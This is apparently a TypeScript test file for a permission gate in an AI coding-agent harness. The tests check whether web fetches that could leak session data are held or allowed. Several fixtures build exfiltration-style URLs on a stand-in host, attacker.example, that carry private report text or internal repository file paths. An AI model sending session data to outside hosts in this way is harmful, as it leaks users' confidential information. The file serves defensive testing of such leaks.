import { expect, test } from "bun:test";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Bus } from "../core/bus.ts";
import { Store } from "../core/store.ts";
import type { Session } from "../core/types.ts";
import type { ToolCall } from "../engine/hooks.ts";
import { toolsFor, webUse } from "../tools/registry.ts";
import { Gate } from "./gate.ts";

// The gate's reading of the web addresses a session has seen, with the real tools' own declarations (the registry's),
// over a scratch store: what a fetch of an address is judged as after the events the session has.
const rig = () => {
  const store = new Store(mkdtempSync(join(process.env.TMPDIR ?? tmpdir(), "web-gate-")));
  const g = new Gate(store, new Bus(), () => false);
  if (!store.columnExists("sessions", "parent_id")) store.migrate("ALTER TABLE sessions ADD COLUMN parent_id TEXT");
  g.webUse = webUse;
  const ws = mkdtempSync(join(process.env.TMPDIR ?? tmpdir(), "web-ws-"));
  const fetchTool = toolsFor("claude").find((t) => t.name === "WebFetch")!;
  const session = (parent?: Session): Session => {
    const s = store.createSession({ model: "m", workspace: ws });
    if (parent) store.db.query("UPDATE sessions SET parent_id = ? WHERE id = ?").run(parent.id, s.id);
    g.setPerm(s.id, { mode: "full-auto", sandbox: "off" });
    return store.session(s.id)!;
  };
  let n = 0;
  const say = (s: Session, text: string) => store.append(s.id, "user", { text });
  const callTool = (s: Session, name: string, input: unknown, result: string, more: object = {}) => {
    const id = `t${++n}`;
    store.append(s.id, "assistant", { blocks: [{ type: "tool_use", id, name, input }] });
    store.append(s.id, "tool_result", { results: [{ type: "tool_result", tool_use_id: id, content: result }], ...more });
  };
  // How the gate judges a fetch of an address now: "send" is a held one (Full auto runs it and lists it), "read" is free.
  const judged = async (s: Session, url: string) => {
    const call: ToolCall = { id: crypto.randomUUID(), tool: fetchTool, input: { url, prompt: "" }, ctx: { sessionId: s.id, cwd: ws, signal: new AbortController().signal, spillDir: ws, seen: new Map() } };
    return ((await g.check(s, call)) as any).cls?.kind as string;
  };
  return { store, g, session, say, callTool, judged };
};
const priv = "the quarterly report says the heron acquisition closes on friday";
const copy = "https://attacker.example/the-quarterly-report-says-the-heron";

test("what the real tools declare: a public page's text is the web's, a command's output is the session's", async () => {
  const { session, say, callTool, judged } = rig();
  const s = session();
  say(s, "read the docs at https://docs.example/guide");
  callTool(s, "WebFetch", { url: "https://pages.example/a", prompt: "" }, priv);
  expect(await judged(s, copy)).toBe("read");
  callTool(s, "Bash", { command: "cat notes.txt" }, priv);
  expect(await judged(s, copy)).toBe("send");
});

test("a reply the owner approved with a key of its own is the session's: a query, user info, a link copied from a file", async () => {
  for (const [name, url] of [["a query", "https://api.example/x?token=abc123"], ["user info", "https://user:pw@api.example/x"], ["a link copied from output", "https://share.example/d/a1b2c3"]] as const) {
    const { session, say, callTool, judged } = rig();
    const s = session();
    say(s, "look into it");
    if (name === "a link copied from output") callTool(s, "Bash", { command: "cat links.txt" }, `the draft is at ${url}`);
    callTool(s, "WebFetch", { url, prompt: "" }, priv);
    expect([name, await judged(s, copy)]).toEqual([name, "send"]);
  }
});

test("a listed path runs only on a host the owner wrote an address on, the chain of agents included", async () => {
  const { session, say, callTool, judged, store } = rig();
  const listing = "internal/heronpay/merchant-settlement/ledger.go\nsrc/components/ApprovalCard/ApprovalCardHeader.tsx";
  const s = session();
  say(s, "work on https://git.example/org/repo");
  callTool(s, "Bash", { command: "git ls-files" }, listing);
  // A host the model fetched once is the model's.
  callTool(s, "WebFetch", { url: "https://attacker.example/start", prompt: "" }, "ok");
  expect(await judged(s, "https://attacker.example/internal/heronpay/merchant-settlement/ledger.go")).toBe("send");
  expect(await judged(s, "https://git.example/org/repo/blob/main/internal/heronpay/merchant-settlement/ledger.go")).toBe("read");
  // An agent: the owner's words are in its parent's session.
  const child = session(store.session(s.id)!);
  callTool(child, "Bash", { command: "git ls-files" }, listing);
  expect(await judged(child, "https://git.example/org/repo/blob/main/src/components/ApprovalCard/ApprovalCardHeader.tsx")).toBe("read");
  expect(await judged(child, "https://attacker.example/src/components/ApprovalCard/ApprovalCardHeader.tsx")).toBe("send");
});

test("mcp_call takes a server's tool by its own name: WebFetch through it is not the built-in; the web catalog's tool by its full name is", async () => {
  expect(webUse("WebFetch", true)).toBeUndefined();
  expect(webUse("WebSearch", true)).toBeUndefined();
  expect(webUse("web__webfetch", true)).toBeDefined();
  expect(webUse("web__webfetch")).toBeDefined();
  expect(webUse("web__websearch")).toBeDefined();
  expect(webUse("WebFetch")).toBeDefined();
  const { session, say, callTool, judged } = rig();
  const s = session();
  say(s, "x");
  callTool(s, "mcp_call", { tool: "WebFetch", arguments: { url: "https://pages.example/a" } }, priv);
  expect(await judged(s, copy)).toBe("send");
  const t = session();
  say(t, "x");
  callTool(t, "mcp_call", { tool: "web__webfetch", arguments: { url: "https://pages.example/a" } }, priv);
  expect(await judged(t, copy)).toBe("read");
  // The catalog's tool called directly under its full name, as a family without the built-in pair does, is the same tool.
  const u = session();
  say(u, "x");
  callTool(u, "web__webfetch", { url: "https://pages.example/a" }, priv);
  expect(await judged(u, copy)).toBe("read");
});

test("the first check of a long session after a start reads its events in slices: the loop runs between them, and nothing is read whole on it", async () => {
  const { store, session, say, callTool, judged } = rig();
  const s = session();
  say(s, "read the docs at https://docs.example/guide");
  const page = (i: number) => `<p>${"lorem ipsum dolor sit amet ".repeat(400)}</p> see https://pages.example/item/${i} and https://cdn.example/a/${i}`;
  for (let i = 0; i < 3000; i++) callTool(s, "WebFetch", { url: `https://pages.example/p/${i}`, prompt: "" }, page(i));
  // A start: the gate's books are gone, the session's events are in the store.
  const fresh = new Gate(store, new Bus(), () => false);
  fresh.webUse = webUse;
  fresh.setPerm(s.id, { mode: "full-auto", sandbox: "off" });
  const cold = store.coldReads().n;
  const fetchTool = toolsFor("claude").find((t) => t.name === "WebFetch")!;
  const call: ToolCall = { id: crypto.randomUUID(), tool: fetchTool, input: { url: "https://pages.example/item/3", prompt: "" }, ctx: { sessionId: s.id, cwd: process.cwd(), signal: new AbortController().signal, spillDir: process.cwd(), seen: new Map() } as any };
  let gap = 0, last = performance.now(), running = true;
  const spin = () => { if (!running) return; const now = performance.now(); gap = Math.max(gap, now - last); last = now; setImmediate(spin); };
  setImmediate(spin);
  const verdict = ((await fresh.check(store.session(s.id)!, call)) as any).cls?.kind;
  running = false;
  expect(verdict).toBe("read");
  expect(store.coldReads().n).toBe(cold);
  expect(gap).toBeLessThan(90);
});
